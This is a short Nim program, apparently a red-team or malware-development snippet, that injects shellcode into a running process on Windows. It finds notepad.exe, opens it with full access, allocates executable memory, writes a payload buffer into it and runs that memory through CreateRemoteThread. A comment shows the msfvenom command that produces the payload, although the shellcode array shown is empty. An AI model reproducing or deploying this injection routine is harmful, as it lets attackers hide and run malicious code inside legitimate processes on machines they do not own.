import winim
import std/[strutils, osproc]

proc findTarget(target: string): int =
  var pe32: PROCESSENTRY32W
  var hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if INVALID_HANDLE_VALUE == hProcSnap: return 0
  pe32.dwsize = sizeof(PROCESSENTRY32W).DWORD
  if Process32First(hProcSnap, pe32):
    while Process32Next(hProcSnap, pe32):
      if target in $$pe32.szExeFile:
        CloseHandle(hProcSnap)
        return pe32.th32ProcessID
  CloseHandle(hProcSnap)
  return 0

proc injectTarget[I, T](pid: int, buf: array[I, T]) =
  var hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid.DWORD)
  var exec_mem = VirtualAllocEx(hProc, NULL, len(buf).SIZE_T, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  var bytesWritten: SIZE_T
  var writeProc = WriteProcessMemory(hProc, exec_mem, unsafeAddr buf, len(buf).SIZE_T, addr bytesWritten)
  var hthread = CreateRemoteThread(hProc, NULL, 0, cast[LPTHREAD_START_ROUTINE](exec_mem), NULL, 0, NULL)
  echo hthread


#[ Main ]#
# msfvenom -p windows/x64/exec CMD="C:\Windows\System32\Calc.exe" -f py
var buf: array[296, byte] = [
byte  ]


var target = "notepad.exe"
var pid = findTarget(target)

injectTarget(pid, buf)